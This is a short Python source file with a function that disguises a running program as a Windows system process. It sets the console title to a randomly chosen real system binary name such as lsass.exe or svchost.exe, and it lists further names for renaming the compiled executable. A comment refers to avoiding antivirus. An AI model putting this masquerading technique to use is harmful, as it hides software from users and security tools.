import sys
import os
import ctypes
import random


def spoof_process_name(process_name: str = None):
    """Make process look like Windows system process
    if process_name is None it will be choosen automatically"""
    try:
        # Change console title (visible in task manager)
        fake_names = [
            "svchost.exe",
            "csrss.exe",
            "winlogon.exe",
            "services.exe",
            "lsass.exe",
            "spoolsv.exe",
            "SearchIndexer.exe",
            "dwm.exe",
            "conhost.exe",
            "RuntimeBroker.exe"
        ]
        ctypes.windll.kernel32.SetConsoleTitleW(random.choice(fake_names))
        
        # If compiled, rename the executable itself (Nuitka will handle this)
        if getattr(sys, 'frozen', False):
            # Get current executable path
            exe_path = sys.executable
            exe_dir = os.path.dirname(exe_path)
            
            # Create a copy with system-like name (optional)
            system_names = [
                "wininit.exe",
                "taskhostw.exe",
                "sihost.exe",
                "ctfmon.exe"
            ]
            # This would require file operations - careful with AV
    except:
        pass